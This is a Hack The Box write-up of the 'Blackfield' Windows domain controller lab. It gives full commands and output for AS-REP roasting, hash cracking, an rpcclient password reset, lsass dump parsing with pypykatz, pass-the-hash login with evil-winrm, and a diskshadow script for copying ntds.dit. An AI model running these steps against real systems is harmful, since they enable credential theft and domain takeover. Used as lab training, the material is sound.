---
title: Blackfield
author: fieldraccoon
date: 2020-10-03 
categories: [hack-the-box, windows]
tags: [hack-the-box, hard, smb, windows-exploits]
math: true
---


Blackfield was a really interesting hard windows box which involed a kerberoasting attack on active directory to obtain credentials. Then using rpcclient to change credentials for another user allowing us access to their machine. Root involved abusing the `SeBackupPrivilege` Using diskshadow to get a root shell.
# User

## Nmap Enumeration

As always we start off with an nmap scan to pick up genral information on the box:
```bash
┌──(kali㉿kali)-[~/htb/boxes/blackfield]
└─$ nmap -sC -sV -Pn blackfield.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 12:59 EDT

Nmap scan report for blackfield.htb (10.10.10.192)
Host is up (0.100s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-10-04 00:03:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/3%Time=5F78AE18%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h03m02s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-10-04T00:05:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.26 seconds

```

By the look of it it sticks out straight away that the attack path will be through active directory. We see that `kerberos` is running and the domain for the machine is `BLACKFIELD.local`. 

We notice that the ports for samba are also open so we go straight ahead and try to enumerate the shares using smbclient.

## Smb

We go ahead and list the shares on the machine using smbclient:
```bash
┌──(kali㉿kali)-[~/htb/boxes/blackfield]
└─$ smbclient -L 10.10.10.192                                                       
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

We notice the 2 shares `forensic` and `profiles$` look fairly interesting so we go ahead and try to list both. We get an access denied for the forensic share so we move on to the `profiles$` share.

```bash
┌──(kali㉿kali)-[~/htb/boxes/blackfield]
└─$ smbclient -U guest //10.10.10.192/profiles$
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 4005990 blocks available
```

We get a long list of users here. We just want the users so we can use some kind of text editor like VSS and cut out all the date time etc. I used a simeple one liner using `awk`.

```bash
cat userfile | awk '{print $1 > "users.txt"}'
```
## AS-REP 

Since we now have a list of users we can use the Script `GetNPUsers.py` from the impacket library which carries out a kerberoasting attack to try and get the `TGT` hash.

As we already have the domain name `blackfield.local` we use that for the command.

```bash
~/tools/impacket/examples/GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -format john -outputfile hash -dc-ip 10.10.10.192


{SNIP}
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
{SNIP}
```

We run it with the formatting able to be cracked by `john the ripper` and output hashes to a file called `hash`. We also notice that a user called `audit2020` throws a different result to the rest of the users so we note this down for later and carry on.

We get loads of errors that fill up the page very quickly but this is fine. 

Let the script finish running and after it stops we check the `hash` file.

```bash
$krb5asrep$support@BLACKFIELD.LOCAL:ccde541c101549131d7c7244d9c1e56a$346e452d5cf60d3c85305cfab8b583a593181ba5a942b5ef7b1e317840250a767532f96dbfeed76d14b3e60491e229e755426910996cf93a92ac72404311a7ccd515657f1fe133f75fdba5a4d7ab7a78067c45fcb5065aadfaa1748ba1505aa6ea80387d7c9e21a1322e26b91e8455829e0cbd7980964cb7995b2f31e3c2319b29bc5401ec532ae00237241c25edcc3fc7310adf802455b1aeb012905ab940decfbe3018c25af894a9312bb2f373683524c525f408fb1a1284602cc7359758b9d00d8b2f459163b5aa46569dc673ba68e9c2c579e1dfeaea62df58967bd409486791c39fb8ab2479cd473f46d5090b81f531908d
```
We let john run on this and sure enough it manages to crack the hash.

```bash
sudo john -w=~/rockyou.txt hash            
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)
1g 0:00:00:27 DONE (2020-10-03 13:16) 0.03598g/s 515832p/s 515832c/s 515832C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can see that this is going to be for the user `support@blackfield.local`

We try logging in with `smbclient`, `psexec` etc but none throw anything good. After a while of digging we try the `rpcclient` tool and we get a login.

```bash
rpcclient -U support 10.10.10.192
Enter WORKGROUP\support's password: 
rpcclient $>
```

We then try to enumerate the users that have access to rpcclient and we get a match.

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
```

We see the user `audit2020` which is the one that we saw earlier.

After some googling of how to access another persons account using rpcclient we come accross a site that allows us to change passwords for another user without having to require the current password.

```bash
rpcclient $> setuserinfo audit2020 23 "Fieldraccoon123"
```

We use the above command to change the password for the user.

We now try to use this account to get access to the `forensic` share that we didnt have access to earlier and it does in fact work.

```bash
smbclient -U audit2020 \\\\10.10.10.192\\forensic
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020
```

```bash
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020
```
We get errors using the command `get` which is often used in smbclient to transfer files to our own machine. 

Instead we use `mount` to mount the forensic share to our box

```bash
sudo mount -t cifs //10.10.10.192/forensic/memory_analysis /mnt/blackfield -o user=audit2020
Password for audit2020@//10.10.10.192/forensic/memory_analysis:  ***************
```

## Dumping the hash for svc_backup
After enumerating the files we conclude that most of them arent really needed. Instead we focus on the file `lsass.zip` , after unzipping the file we get a new file called `lsass.DMP`.  A DMP file in windows is a memory dump file. After looking into this further we gather that we can use mimikatz to dump hashes from the file. We use a script from the mimikatz family called `pypykatz`. 

After installing it we can dump the hashes using the simple command.

```bash
pypykatz lsa minidump lsass.DMP
```

It gives a massive long list of output for several different accounts so ive cut it down just to the important one.

```bash
Username: svc_backup
Domain: BLACKFIELD
LM: NA
NT: 9658d1d1dcd9250115e2205d9f48400d
```
## User.txt

We now login to `evil-winrm` using the NT hash.
```bash
root@kali:/mnt/blackfield# evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
l*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/3/2020   4:24 PM             34 user.txt
```

And we can now successfully read the user flag!

# Root

## whoami /all

After initially checking our privelages with `whoami /all` we see an interesting group that the user is part of called 

`BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group`

After researching for a while about how we can exploit this we find this useful pdf online. [pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
 
We basically have to obtain the admin hash by getting the Windows registry files `system` and `ntds.dit` which is the file that stored the active directory info. After that we can use `secretsdump` from impacket to dump our admin hash.

## Exploitation

Our steps are as follows:

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> download system.hive
Info: Downloading C:\Users\svc_backup\Desktop\system.hive to system.hive

                                                             
Info: Download successful!
```

We then use the script from this website [link](https://pentestlab.blog/tag/diskshadow/) which shows us our script.

```bash
set context persistent nowriters 
set metadata C:\Users\svc_backup\Links\empty\metadata.cab 
add volume c: alias someAlias 
create 
expose %someAlias% j: 
exec "cmd.exe" /c copy j:\windows\ntds\ntds.dit c:\Users\svc_backup\Links\empty\ntds.dit 
delete shadows volume %someAlias% 
reset
```

Then upload the file.

```bash
*Evil-WinRM* PS C:\tmp> upload script.txt
Info: Uploading script.txt to C:\tmp\script.txt

                                                             
Data: 380 bytes of 380 bytes copied

Info: Upload successful!
```

